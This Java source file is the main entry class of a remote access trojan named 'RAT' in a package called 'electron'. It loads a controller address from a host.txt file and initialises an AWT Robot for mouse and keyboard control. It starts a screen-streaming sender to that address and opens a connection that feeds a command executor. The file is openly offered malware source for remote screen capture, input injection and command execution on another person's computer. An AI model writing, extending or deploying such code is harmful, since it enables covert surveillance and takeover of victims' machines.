package electron;

import java.awt.AWTException;
import java.awt.Robot;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.concurrent.locks.LockSupport;

import javax.swing.JOptionPane;

import electron.console.logger;
import electron.functions.Keyboard;
import electron.functions.MouseTweaks;
import electron.networking.CommandExecutor;
import electron.networking.Connection;
import electron.networking.ScreenV2Sender;
import electron.networking.packets.ErrorPacket;
import electron.tools.FileOptions;

public class RAT {
	private static ScreenV2Sender ssender;
	public static boolean isNativeImage;

	public static void main(String[] args) throws IOException {
		logger.log("[RAT.main]: Loading...");
		String os = System.getProperty("os.name") + " " + System.getProperty("os.arch") + " "
				+ System.getProperty("os.version");
		// Is this app compiled with graalvm native-image
		// Best native-image fork to compile this app:
		// https://bell-sw.com/pages/downloads/native-image-kit/
		if (System.getProperty("java.home") == null) {
			isNativeImage = true;
		} else {
			isNativeImage = false;
		}
		logger.log("[RAT.main]: ---------------------------");
		logger.log("[RAT.main]: Installation data:");
		logger.log("[RAT.main]: OS: " + os);
		logger.log("[RAT.main]: Is native image: " + isNativeImage);
		logger.log("[RAT.main]: ---------------------------");
		// Loading network configuration
		logger.log("[RAT.main]: loading network data...");
		File host = new File("host.txt");
		String address;
		if (host.exists() == false) {
			if (isNativeImage) {
				logger.error("[RAT.main]: can't find external network config file for native-image executable.");
				logger.log("[RAT.main]: Bye.");
				return;
			}
			InputStream in = RAT.class.getClassLoader().getResourceAsStream("electron/host.txt");
			address = FileOptions.getInternalFileLineWithSeparator(in, ":");
		} else {
			// Loading file from external file
			address = FileOptions.getFileLineWithSeparator(FileOptions.getFileLines(host.getPath()), ":");
		}
		logger.log("[RAT.main]: Success.");
		// Initializing Robot
		logger.log("[RAT.main]: ---------------------------");
		logger.log("[RAT.main]: Initializing Robot...");
		try {
			Robot r = new Robot();
			Connection.r = r;
			MouseTweaks.setRobot(r);
			Keyboard.setRobot(r);
			CommandExecutor.r = r;
			ssender = new ScreenV2Sender(r, address);
			ssender.start();
			logger.log("[RAT.main]: Robot: Success!");
		} catch (AWTException e) {
			logger.error("[RAT.main]: error initializing Robot: " + e.getMessage());
			while (!Connection.isConnected()) {
				LockSupport.parkNanos(1000);
			}
			ErrorPacket.sendError("[RAT.main]: error initializing Robot: " + e.getMessage());
		}
		// Starting network
		Thread ServListener = new Connection(address);
		ServListener.start();
		logger.log("[RAT.main]: ---------------------------");
		logger.log("[RAT.main]: Loaded.");
	}
}
